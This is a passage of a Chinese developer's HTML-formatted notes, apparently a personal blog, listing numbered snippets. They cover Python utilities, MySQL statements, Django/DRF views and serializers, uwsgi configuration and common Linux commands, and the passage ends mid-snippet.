class=\"headerlink\" title=\"12、订单编号\"></a>12、订单编号</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from random import Random</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">def random_str(randomlength=8):</span><br><span class=\"line\">    str = &#x27;&#x27;</span><br><span class=\"line\">    chars = &#x27;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789&#x27;</span><br><span class=\"line\">    length = len(chars) - 1</span><br><span class=\"line\">    random = Random()</span><br><span class=\"line\">    for i in range(randomlength):</span><br><span class=\"line\">        str+=chars[random.randint(0, length)]</span><br><span class=\"line\">    return str</span><br><span class=\"line\"></span><br><span class=\"line\">def order_num():</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    生成付款订单号</span><br><span class=\"line\">    :return:</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    local_time = time.strftime(&#x27;%Y%m%d%H%M%S&#x27;, time.localtime(time.time()))</span><br><span class=\"line\">    result = local_time + random_str(5)</span><br><span class=\"line\">    return result</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(order_num())</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"13、mysql自动填写当前时间\"><a href=\"#13、mysql自动填写当前时间\" class=\"headerlink\" title=\"13、mysql自动填写当前时间\"></a>13、mysql自动填写当前时间</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">CURRENT_TIMESTAMP</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20190312172747658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">为表添加索引</span><br><span class=\"line\"></span><br><span class=\"line\">ALTER table tableName ADD INDEX indexName(columnName)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"14、drf动态过滤查询\"><a href=\"#14、drf动态过滤查询\" class=\"headerlink\" title=\"14、drf动态过滤查询\"></a>14、drf动态过滤查询</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># page.py</span><br><span class=\"line\"></span><br><span class=\"line\">from rest_framework.pagination import PageNumberPagination</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class UserPagination(PageNumberPagination):</span><br><span class=\"line\">    &quot;&quot;&quot;用户分页器&quot;&quot;&quot;</span><br><span class=\"line\">    page_size = 10  # 默认的页面数据数量</span><br><span class=\"line\">    page_query_param = &#x27;page&#x27;  # 定制取数据页码key </span><br><span class=\"line\">    page_size_query_param = &#x27;page_size&#x27;  # 默认取数据页码key </span><br><span class=\"line\">    max_page_size = 15   # 数据每页取值的最大上限</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># serializers.py</span><br><span class=\"line\"></span><br><span class=\"line\">from rest_framework import serializers</span><br><span class=\"line\"></span><br><span class=\"line\">from user.models import UserInfo</span><br><span class=\"line\"></span><br><span class=\"line\">class UserSerializers(serializers.ModelSerializer):</span><br><span class=\"line\">    &quot;&quot;&quot;用户收货地址&quot;&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">    class Meta:</span><br><span class=\"line\">        model = UserInfo</span><br><span class=\"line\">\t    # 所有字段</span><br><span class=\"line\">        #fields = &#x27;__all__&#x27;</span><br><span class=\"line\">        fields = [&#x27;name&#x27;, &#x27;code&#x27;, &#x27;title&#x27;,  &#x27;province&#x27;, &#x27;city&#x27;,</span><br><span class=\"line\">                    &#x27;quxian&#x27;, &#x27;address&#x27;, &#x27;code__gte&#x27;, &#x27;code__lte&#x27;]</span><br><span class=\"line\">        # 显示外键</span><br><span class=\"line\">        depth = 2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># views.py</span><br><span class=\"line\">class MachineViews(APIView):</span><br><span class=\"line\">    def get(self, request, *args, **kwargs):</span><br><span class=\"line\">        # 从前端获取出来的过滤参数，解析成字典传进filter()函数中</span><br><span class=\"line\">        # 动态过滤，</span><br><span class=\"line\">        kwargs = &#123;&#125;</span><br><span class=\"line\">        # 表中的字段名</span><br><span class=\"line\">        columns = [&#x27;name&#x27;, &#x27;code&#x27;, &#x27;title&#x27;,  &#x27;province&#x27;, &#x27;city&#x27;,</span><br><span class=\"line\">                    &#x27;quxian&#x27;, &#x27;address&#x27;, &#x27;code__gte&#x27;, &#x27;code__lte&#x27;]</span><br><span class=\"line\">        for k, v in request.query_params.items():</span><br><span class=\"line\">            if k not in columns:</span><br><span class=\"line\">                return Response(&#x27;参数不对&#x27;, status=status.HTTP_400_BAD_REQUEST)</span><br><span class=\"line\">\t\t\tif v:</span><br><span class=\"line\">            \tkwargs[k] = v</span><br><span class=\"line\"></span><br><span class=\"line\">        users = UserInfo.objects.filter(**kwargs)</span><br><span class=\"line\">        page = UserPagination()</span><br><span class=\"line\">        page_goods_list = page.paginate_queryset(users, self.request, self)</span><br><span class=\"line\">        ser = UserSerializers(page_goods_list, many=True)</span><br><span class=\"line\">        return page.get_paginated_response(ser.data)</span><br><span class=\"line\">        </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"15、linux后台运行python程序\"><a href=\"#15、linux后台运行python程序\" class=\"headerlink\" title=\"15、linux后台运行python程序\"></a>15、linux后台运行python程序</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">nohup /home/project_venv/user/bin/python3 -u /home/user/user_server.py &gt;&gt; /home/user/user.log 2&gt;&amp;1 &amp;   </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"16、追加外键\"><a href=\"#16、追加外键\" class=\"headerlink\" title=\"16、追加外键\"></a>16、追加外键</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER TABLE tb_commentPhoto ADD CONSTRAINT FK_comment_phone</span><br><span class=\"line\">FOREIGN KEY tb_goodsComment(id) REFERENCES tb_commentPhoto(comment_id);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"17、写-读CSV文件，查看是否存在，若存在就从csv中删除\"><a href=\"#17、写-读CSV文件，查看是否存在，若存在就从csv中删除\" class=\"headerlink\" title=\"17、写/读CSV文件，查看是否存在，若存在就从csv中删除\"></a>17、写/读CSV文件，查看是否存在，若存在就从csv中删除</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import csv</span><br><span class=\"line\">import random</span><br><span class=\"line\">import string</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def create_invite_code(random_code_pool=None, length=6, num=10, is_append=False):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    创建随机邀请码,并写入txt文件</span><br><span class=\"line\">    :param: random_code_pool 随机邀请码</span><br><span class=\"line\">    :param: length 邀请码长度</span><br><span class=\"line\">    :param: num 邀请码个数</span><br><span class=\"line\">    :param: is_append True追加,False 覆盖</span><br><span class=\"line\">    :return:</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    if not random_code_pool:</span><br><span class=\"line\">        code_pool = string.ascii_uppercase + string.digits</span><br><span class=\"line\">        random_code_pool = []</span><br><span class=\"line\">        for i in range(num):</span><br><span class=\"line\">            s = &#x27;&#x27;</span><br><span class=\"line\">            for _ in range(length):</span><br><span class=\"line\">                s += random.choice(code_pool)</span><br><span class=\"line\">            if s and s not in random_code_pool:</span><br><span class=\"line\">                random_code_pool.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 写入方法。是追加还是覆盖</span><br><span class=\"line\">    write_method = &#x27;a+&#x27; if is_append else &#x27;w&#x27;</span><br><span class=\"line\">    # 写入文件</span><br><span class=\"line\">    with open(&#x27;./invite_code.csv&#x27;, write_method, newline=&#x27;&#x27;) as f:</span><br><span class=\"line\">        writer = csv.writer(f)</span><br><span class=\"line\">        for rowData in random_code_pool:</span><br><span class=\"line\">            # 按行写入</span><br><span class=\"line\">            writer.writerow((rowData,))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def check_invite_code(code):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    查看邀请码是否存在txt文件中，</span><br><span class=\"line\">    若存在就返回True，并在txt文件中删除</span><br><span class=\"line\">    若不存在就返回False</span><br><span class=\"line\">    :param code:</span><br><span class=\"line\">    :return:</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    code_pool = []</span><br><span class=\"line\">    with open(&#x27;./invite_code.csv&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;,errors=&#x27;ignore&#x27;) as f:</span><br><span class=\"line\">        allFileInfo = csv.reader(f)</span><br><span class=\"line\">        for row in allFileInfo:</span><br><span class=\"line\">            code_pool.append(row[0])</span><br><span class=\"line\"></span><br><span class=\"line\">    if code in code_pool:</span><br><span class=\"line\">        # 删除查询的code</span><br><span class=\"line\">        code_pool.pop(code_pool.index(code))</span><br><span class=\"line\"></span><br><span class=\"line\">        # 重新写入文件</span><br><span class=\"line\">        create_invite_code(code_pool,is_append=False)</span><br><span class=\"line\">        return True</span><br><span class=\"line\">    return False</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    # create_invite_code(length=9,num=100)</span><br><span class=\"line\">    print(check_invite_code(&#x27;WJ4PSTJG2&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"18、django中从request获取访问路径\"><a href=\"#18、django中从request获取访问路径\" class=\"headerlink\" title=\"18、django中从request获取访问路径\"></a>18、django中从request获取访问路径</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(&#x27;获取相对路径&#x27;, request.get_full_path())</span><br><span class=\"line\">print(&#x27;获取绝对路径&#x27;, request.build_absolute_uri())</span><br><span class=\"line\">print(request.build_absolute_uri(&#x27;?&#x27;))</span><br><span class=\"line\">print(request.build_absolute_uri(&#x27;/&#x27;)[:-1].strip(&quot;/&quot;))</span><br><span class=\"line\">print(request.build_absolute_uri(&#x27;/&#x27;).strip(&quot;/&quot;))</span><br><span class=\"line\">print(request.build_absolute_uri(&#x27;/&#x27;))</span><br><span class=\"line\">print(&#x27;----------&#x27;)</span><br><span class=\"line\">print(request.META[&#x27;HTTP_HOST&#x27;])</span><br><span class=\"line\">print(request.META[&#x27;PATH_INFO&#x27;])</span><br><span class=\"line\">print(request.META[&#x27;QUERY_STRING&#x27;])</span><br><span class=\"line\">iphost = request.META.get(&#x27;REMOTE_ADDR&#x27;, &#x27;&#x27;)  # 获取访问来源IP</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 输出如：</span><br><span class=\"line\">获取相对路径 /QRcode/?d=1</span><br><span class=\"line\">获取绝对路径 http://127.0.0.1:8000/QRcode/?d=1</span><br><span class=\"line\">http://127.0.0.1:8000/QRcode/</span><br><span class=\"line\">http://127.0.0.1:8000</span><br><span class=\"line\">http://127.0.0.1:8000</span><br><span class=\"line\">http://127.0.0.1:8000/</span><br><span class=\"line\">----------</span><br><span class=\"line\">127.0.0.1:8000</span><br><span class=\"line\">/QRcode/</span><br><span class=\"line\">d=1</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"19、Django收集静态文件\"><a href=\"#19、Django收集静态文件\" class=\"headerlink\" title=\"19、Django收集静态文件\"></a>19、Django收集静态文件</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">先在项目根目录下创建一个static文件夹</span><br><span class=\"line\">然后在settings.py中设置</span><br><span class=\"line\">STATIC_ROOT = os.path.join(BASE_DIR, &#x27;static&#x27;)</span><br><span class=\"line\">最后执行下面的命令：</span><br><span class=\"line\">python manage.py collectstatic</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"20、xadmin插件\"><a href=\"#20、xadmin插件\" class=\"headerlink\" title=\"20、xadmin插件\"></a>20、xadmin插件</h2><p><a href=\"https://www.cnblogs.com/lanqie/p/8340215.html\">https://www.cnblogs.com/lanqie/p/8340215.html</a></p>\n<h2 id=\"21、uwsgi自动重启\"><a href=\"#21、uwsgi自动重启\" class=\"headerlink\" title=\"21、uwsgi自动重启\"></a>21、uwsgi自动重启</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[uwsgi]</span><br><span class=\"line\"># 使用nginx连接时 使用</span><br><span class=\"line\">socket=0.0.0.0:2019</span><br><span class=\"line\"># 直接作为web服务器使用</span><br><span class=\"line\">#http=0.0.0.1:8000</span><br><span class=\"line\"># 配置工程目录</span><br><span class=\"line\">chdir=/home/user</span><br><span class=\"line\"># 配置项目的wsgi目录。相对于工程目录</span><br><span class=\"line\">wsgi-file=user/wsgi.py</span><br><span class=\"line\">virtualenv=/home/project_venv/user</span><br><span class=\"line\">#配置进程，线程信息</span><br><span class=\"line\">processes=1</span><br><span class=\"line\">threads=1</span><br><span class=\"line\">enable-threads=True</span><br><span class=\"line\">master=True</span><br><span class=\"line\">pidfile=uwsgi.pid</span><br><span class=\"line\">daemonize=uwsgi.log</span><br><span class=\"line\">#启动uwsgi的用户名和用户组</span><br><span class=\"line\">uid=root</span><br><span class=\"line\">gid=root</span><br><span class=\"line\">#uwsgi自动重启</span><br><span class=\"line\">py-autoreload=1</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"22、谷歌浏览器快捷键\"><a href=\"#22、谷歌浏览器快捷键\" class=\"headerlink\" title=\"22、谷歌浏览器快捷键\"></a>22、谷歌浏览器快捷键</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">浏览器缓存</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl+Shift+Del  清除Google浏览器缓存的快捷键</span><br><span class=\"line\"></span><br><span class=\"line\">Ctrl+Shift+R  重新加载当前网页而不使用缓存内容</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"23、git克隆分支\"><a href=\"#23、git克隆分支\" class=\"headerlink\" title=\"23、git克隆分支\"></a>23、git克隆分支</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone -b dev 地址 </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"24、mysql更新语句、新增列、删除列\"><a href=\"#24、mysql更新语句、新增列、删除列\" class=\"headerlink\" title=\"24、mysql更新语句、新增列、删除列\"></a>24、mysql更新语句、新增列、删除列</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">update user set name=&#x27;张三&#x27; where id=111</span><br><span class=\"line\"># 删除</span><br><span class=\"line\">DELETE FROM table_name [WHERE Clause]</span><br><span class=\"line\"></span><br><span class=\"line\"># 增加字段</span><br><span class=\"line\">alter table 表名 add column 列名 类型;</span><br><span class=\"line\"># 删除字段</span><br><span class=\"line\">alter table 表名 dropcolumn 列名 ;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"25、删除指定格式的文件\"><a href=\"#25、删除指定格式的文件\" class=\"headerlink\" title=\"25、删除指定格式的文件\"></a>25、删除指定格式的文件</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def remove_specified_format_file(file_dir, format_name):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    删除指定格式的文件</span><br><span class=\"line\">    :param file_dir: 文件根目录</span><br><span class=\"line\">    :param format_name: 格式</span><br><span class=\"line\">    :return:</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    for root, dirs, files in os.walk(file_dir):</span><br><span class=\"line\">        # print(root) #当前目录路径</span><br><span class=\"line\">        # print(dirs) #当前路径下所有子目录</span><br><span class=\"line\">        # print(files) #当前路径下所有非目录子文件</span><br><span class=\"line\">        for file in files:</span><br><span class=\"line\">            if re.match(format_name, file):</span><br><span class=\"line\">                print(os.path.join(root, file))</span><br><span class=\"line\">                os.remove(os.path.join(root, file))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">remove_specified_format_file(r&#x27;D:\\学习\\LDC\\java&#x27;, r&#x27;\\._*&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"26、计算文件总数\"><a href=\"#26、计算文件总数\" class=\"headerlink\" title=\"26、计算文件总数\"></a>26、计算文件总数</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def file_count(file_dir):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    </span><br><span class=\"line\">    :param file_dir: 文件根目录</span><br><span class=\"line\">    :return:</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    count = 0</span><br><span class=\"line\">    for root, dirs, files in os.walk(file_dir):</span><br><span class=\"line\">        # print(root) #当前目录路径</span><br><span class=\"line\">        # print(dirs) #当前路径下所有子目录</span><br><span class=\"line\">        # print(files) #当前路径下所有非目录子文件</span><br><span class=\"line\">        count += len(files)</span><br><span class=\"line\">    return count</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(file_count(r&#x27;D:\\学习\\LDC\\java\\Java学习\\newEstore\\estore\\js&#x27;))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"27、计算文件夹大小\"><a href=\"#27、计算文件夹大小\" class=\"headerlink\" title=\"27、计算文件夹大小\"></a>27、计算文件夹大小</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">def file_size(file_dir):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    删除指定格式的文件</span><br><span class=\"line\">    :param file_dir: 文件根目录</span><br><span class=\"line\">    :return:</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    size = 0</span><br><span class=\"line\">    for root, dirs, files in os.walk(file_dir):</span><br><span class=\"line\">        # print(root) #当前目录路径</span><br><span class=\"line\">        # print(dirs) #当前路径下所有子目录</span><br><span class=\"line\">        # print(files) #当前路径下所有非目录子文件</span><br><span class=\"line\">        for file in files:</span><br><span class=\"line\">            size += os.path.getsize(os.path.join(root, file))</span><br><span class=\"line\">\t# M为单位</span><br><span class=\"line\">    return size / 1024 / 1024</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">file_name = r&#x27;D:\\学习&#x27;</span><br><span class=\"line\">print(file_size(file_name))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"28、Django实现jsonp跨域\"><a href=\"#28、Django实现jsonp跨域\" class=\"headerlink\" title=\"28、Django实现jsonp跨域\"></a>28、Django实现jsonp跨域</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># html</span><br><span class=\"line\">$.ajax(&#123;</span><br><span class=\"line\">                    url: &#x27;请求路由&#x27;,</span><br><span class=\"line\">                    type: &#x27;GET&#x27;,</span><br><span class=\"line\">                    dataType: &#x27;JSONP&#x27;,</span><br><span class=\"line\">                    data:&#123;</span><br><span class=\"line\">                      code: &#x27;yes&#x27;,</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                    jsonp: &#x27;callback&#x27;,</span><br><span class=\"line\">                    success: function(res) &#123;</span><br><span class=\"line\">                       var selectData = $.parseJSON(res);</span><br><span class=\"line\">                       alert(selectData);</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                    error: function(err) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"># views.py</span><br><span class=\"line\">def get(self, request, *args, **kwargs):</span><br><span class=\"line\">        code = request.GET.get(&#x27;code&#x27;, &#x27;&#x27;)</span><br><span class=\"line\">        # 跨域请求</span><br><span class=\"line\">        callback = request.GET.get(&#x27;callback&#x27;, &#x27;&#x27;)</span><br><span class=\"line\">        return HttpResponse(&quot;%s(&#x27;%s&#x27;)&quot; % (callback, json.dumps(&#123;&#x27;code&#x27;: code&#125;)), status=status.HTTP_200_OK)</span><br><span class=\"line\">                    </span><br><span class=\"line\">cors解决跨域</span><br><span class=\"line\"></span><br><span class=\"line\">https://www.cnblogs.com/wxiaoyu/p/9578848.html</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"29、微信获取用户信息\"><a href=\"#29、微信获取用户信息\" class=\"headerlink\" title=\"29、微信获取用户信息\"></a>29、微信获取用户信息</h2><p>参考：<a href=\"https://blog.csdn.net/weixin_39735923/article/details/79202563\">https://blog.csdn.net/weixin_39735923/article/details/79202563</a></p>\n<h2 id=\"30、uwsgi初始配置问题\"><a href=\"#30、uwsgi初始配置问题\" class=\"headerlink\" title=\"30、uwsgi初始配置问题\"></a>30、uwsgi初始配置问题</h2><p><a href=\"https://blog.csdn.net/weixin_39735923/article/details/79202563\">https://blog.csdn.net/weixin_39735923/article/details/79202563</a></p>\n<h2 id=\"31、django中drf序列化\"><a href=\"#31、django中drf序列化\" class=\"headerlink\" title=\"31、django中drf序列化\"></a>31、django中drf序列化</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 序列化器</span><br><span class=\"line\">class MsgSerializers(serializers.ModelSerializer):</span><br><span class=\"line\">    addtime = serializers.DateTimeField(read_only=True, format=&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class=\"line\">    hasread = serializers.CharField(source=&#x27;get_hasread_display&#x27;)</span><br><span class=\"line\">    msgtype = serializers.CharField(source=&#x27;get_msgtype_display&#x27;)</span><br><span class=\"line\">    class Meta:</span><br><span class=\"line\">        model = MallMsg</span><br><span class=\"line\">        # 可以混合使用</span><br><span class=\"line\">        fields = &#x27;__all__&#x27;  # &#x27;__all__&#x27; 所有字段</span><br><span class=\"line\">        # 数据库层级控制（序列化链表操作）</span><br><span class=\"line\">        # depth = 1  # 外键层级</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#分页器</span><br><span class=\"line\">from rest_framework.pagination import PageNumberPagination</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class MyLimitOffsetPagination(PageNumberPagination):</span><br><span class=\"line\"></span><br><span class=\"line\">    page_size = 3  # 默认的页面数据数量</span><br><span class=\"line\">    page_query_param = &#x27;page&#x27;  # 定制取数据页码key ？</span><br><span class=\"line\">    page_size_query_param = &#x27;page_size&#x27;  # 默认取数据页码key &amp;</span><br><span class=\"line\">    max_page_size = 15  # 数据每页取值的最大上限</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"32、第三方库\"><a href=\"#32、第三方库\" class=\"headerlink\" title=\"32、第三方库\"></a>32、第三方库</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">安装openssl</span><br><span class=\"line\"> pip3 install pyOpenSSL</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"33、requests请求https携带CA证书\"><a href=\"#33、requests请求https携带CA证书\" class=\"headerlink\" title=\"33、requests请求https携带CA证书\"></a>33、requests请求https携带CA证书</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import OpenSSL</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import urllib3.contrib.pyopenssl</span><br><span class=\"line\"></span><br><span class=\"line\">urllib3.contrib.pyopenssl.inject_into_urllib3()</span><br><span class=\"line\"></span><br><span class=\"line\">def p12_to_pem(certname, pwd):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    从.p12文件中提取pem</span><br><span class=\"line\">    :param certname:</span><br><span class=\"line\">    :param pwd:</span><br><span class=\"line\">    :return:</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    pem_name = certname + &quot;.pem&quot;</span><br><span class=\"line\">    f_pem = open(pem_name, &#x27;wb&#x27;)</span><br><span class=\"line\">    p12file = certname + &quot;.p12&quot;</span><br><span class=\"line\">    p12 = OpenSSL.crypto.load_pkcs12(open(p12file, &#x27;rb&#x27;).read(), pwd)</span><br><span class=\"line\">    f_pem.write(OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_PEM, p12.get_privatekey()))</span><br><span class=\"line\">    f_pem.write(OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, p12.get_certificate()))</span><br><span class=\"line\">    ca = p12.get_ca_certificates()</span><br><span class=\"line\">    if ca is not None:</span><br><span class=\"line\">        for cert in ca:</span><br><span class=\"line\">            f_pem.write(OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_PEM, cert))</span><br><span class=\"line\">    f_pem.close()</span><br><span class=\"line\">    return pem_name</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def post_cert_request(url, data,header, certname, pwd):</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    使用证书发起https请求</span><br><span class=\"line\">    :param url:</span><br><span class=\"line\">    :param data:</span><br><span class=\"line\">    :param certname:</span><br><span class=\"line\">    :param pwd:</span><br><span class=\"line\">    :return:</span><br><span class=\"line\">    &quot;&quot;&quot;</span><br><span class=\"line\">    if (certname != &quot;&quot;):</span><br><span class=\"line\">        cert = p12_to_pem(certname, pwd)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        cert = None</span><br><span class=\"line\">    r = requests.post(url, header=header, data=data, cert=cert)</span><br><span class=\"line\">    return r</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"34、django创建缓存命令\"><a href=\"#34、django创建缓存命令\" class=\"headerlink\" title=\"34、django创建缓存命令\"></a>34、django创建缓存命令</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python manage.py createcachetable 缓存表名</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"35、Django-更改超级用户密码\"><a href=\"#35、Django-更改超级用户密码\" class=\"headerlink\" title=\"35、Django 更改超级用户密码\"></a>35、Django 更改超级用户密码</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">在工程文件目录下敲入：</span><br><span class=\"line\">python manage.py shell</span><br><span class=\"line\"></span><br><span class=\"line\">再在python交互界面输入：</span><br><span class=\"line\">from django.contrib.auth.models import User</span><br><span class=\"line\">user = User.objects.get(username = &#x27;用户名&#x27;)</span><br><span class=\"line\">user.set_password(&#x27;密码&#x27;)</span><br><span class=\"line\">user.save()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"36、restframe使用缓存\"><a href=\"#36、restframe使用缓存\" class=\"headerlink\" title=\"36、restframe使用缓存\"></a>36、restframe使用缓存</h2><p><a href=\"https://blog.csdn.net/Odyssues_lee/article/details/80872586\">https://blog.csdn.net/Odyssues_lee/article/details/80872586</a></p>\n<h2 id=\"37、数据库\"><a href=\"#37、数据库\" class=\"headerlink\" title=\"37、数据库\"></a>37、数据库</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from user  where ISNULL(code)</span><br><span class=\"line\">update user set code=&#x27;111&#x27;,info=&#x27;微信&#x27; where ISNULL(code)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"38、linux常用命令\"><a href=\"#38、linux常用命令\" class=\"headerlink\" title=\"38、linux常用命令\"></a>38、linux常用命令</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tail -f 日志名  实时监控日志</span><br><span class=\"line\">tail -f 80_v10.log</span><br><span class=\"line\"></span><br><span class=\"line\">netstat -na|grep 80  查看端口tcp连接数</span><br><span class=\"line\">netstat -na|grep 80 | wc -l 计算端口tcp连接数</span><br><span class=\"line\"></span><br><span class=\"line\">ps -ef|grep python  查看有多少python程序在运行</span><br><span class=\"line\"></span><br><span class=\"line\">gunzip 2015.csv.gz   # 解压</span><br><span class=\"line\">unzip 19.zip # 解压zip</span><br><span class=\"line\">wc -l 2015.csv   # 查看行数</span><br><span class=\"line\">apt install lrzsz  # 安装</span><br><span class=\"line\">sz 文件名  # 下载文件</span><br><span class=\"line\"></span><br><span class=\"line\">查找文件</span><br><span class=\"line\">find / -name 文件名</span><br><span class=\"line\"></span><br><span class=\"line\">匹配执行过的以find为开头的命令</span><br><span class=\"line\">history | grep find</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"39、xadmin禁止增加、删除\"><a href=\"#39、xadmin禁止增加、删除\" class=\"headerlink\" title=\"39、xadmin禁止增加、删除\"></a>39、xadmin禁止增加、删除</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># models.py</span><br><span class=\"line\"># 用户管理</span><br><span class=\"line\">class UserManage(models.Model):</span><br><span class=\"line\">    name = models.CharField(max_length=20, verbose_name=&#x27;用户名&#x27;)</span><br><span class=\"line\">    phone = models.CharField(max_length=11, unique=True, verbose_name=&#x27;手机号&#x27;)</span><br><span class=\"line\">    code = models.CharField(max_length=11, unique=True, verbose_name=&#x27;编号&#x27;)</span><br><span class=\"line\">    </span><br><span class=\"line\">    user = models.ForeignKey(User, on_delete=models.CASCADE, editable=False, null=True, verbose_name=&#x27;管理员&#x27;)</span><br><span 